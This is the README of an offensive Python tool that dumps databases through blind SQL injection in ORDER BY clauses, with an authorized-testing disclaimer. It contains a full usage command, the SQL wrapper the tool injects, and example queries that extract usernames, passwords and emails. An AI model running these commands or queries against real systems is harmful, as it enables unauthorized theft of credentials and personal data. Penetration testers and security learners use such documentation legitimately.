# ORB SQLi Dumper

**ORB** (Order-based SQLi Blind Dumper) is a multithreaded Python tool for exploiting blind SQL injection vulnerabilities via `ORDER BY` clause injection. It supports dumping:

- Database names
- Table names in a database
- Custom SQL SELECT query results (multi-column + multi-row)

⚠️ **FOR EDUCATIONAL & AUTHORIZED TESTING ONLY**  
Don't be stupid. Use this on targets you are authorized to test (e.g., bug bounty, labs, CTFs).

---

## 🔥 Features

- Boolean-based blind SQLi via `ORDER BY`
- Supports injection with a custom truth-string
- Binary search ASCII-based extraction
- Multi-threaded query dumping
- Supports raw HTTP headers
- Dumps multiple rows/columns using `GROUP_CONCAT + CONCAT_WS`
- Handles messy parsing via `~` separator workaround
- Thread batching & smart flushing to file or stdout

## ⚙️ Usage

```bash
python3 orb_dumper.py --url "https://target.com/products?sort=INJ" \
                      --collname id \
                      --true-string 'Success message' \
                      --headers "Cookie: sessid=abc123; User-Agent: chrome" \
                      --sql-query "SELECT col1,col2,col3 FROM users LIMIT 5000" \
                      -t 4 \
                      -o results.txt
```
Or just check help:

```bash
python3 orb_dumper.py -h
```


## 🎮 Modes

| ՝--wish՝ | Mode                | Description                            |
|----------|---------------------|----------------------------------------|
| ՝1՝      | Dump DB names       | Extracts all schema (database) names   |
| ՝2՝      | Dump table names    | Prompts for DB name, then lists tables |
| ՝3՝      | Custom query mode   | Dump results of any SELECT query       |

Alternatively, you can pass a custom query using ՝--sql-query "SELECT ..."՝ directly.  
If ՝--sql-query՝ is used, ՝--wish՝ is ignored.

---

## ⚠️ Notes & Warnings

- Uses the placeholder string ՝INJ՝ in your URL for injection point.
- The tool wraps your query inside:

՝՝՝sql
SELECT GROUP_CONCAT(CONCAT_WS(',', col1,col2,...) SEPARATOR '~') FROM (...)
՝՝՝

- Then replaces `~` with `\n` as a workaround since actual newline had parsing issues during char-by-char extraction.

- Make sure to **limit your custom queries** like:

՝՝՝sql
SELECT col1, col2 FROM users LIMIT 10000
՝՝՝

- Large result sets (>1 million characters) may crash your system or spike memory. Try to stick to ~10,000 rows.
- The default ASCII char range is [32–126]; anything outside returns as `?`.

---

## 💡 Tips

- Increase ՝-t՝ (threads) for faster dumps — e.g. ՝-t 8՝
- Test the injection point with a small query before running big ones.
- Set ՝--true-string՝ to a response the server gives when condition is true.
- This tool works great against apps filtering via ՝ORDER BY՝ clauses.

## 🤖 Example Queries

՝՝՝sql
-- Dumping users
SELECT id,username,password FROM users LIMIT 5000

-- Dumping log data
SELECT ip,timestamp,message FROM logs LIMIT 10000

-- Dumping emails
SELECT email FROM newsletter_subs LIMIT 500
՝՝՝

## ✍️ Author Notes

> “I cheated a bit while coding this 😅 — used ՝GROUP_CONCAT՝ + ՝SEPARATOR ~՝ to stack results into one value, and dumped it char-by-char using multithreading.  
> Also had to cap binary search max range to avoid crashing my PC. But hey — it works beautifully.”
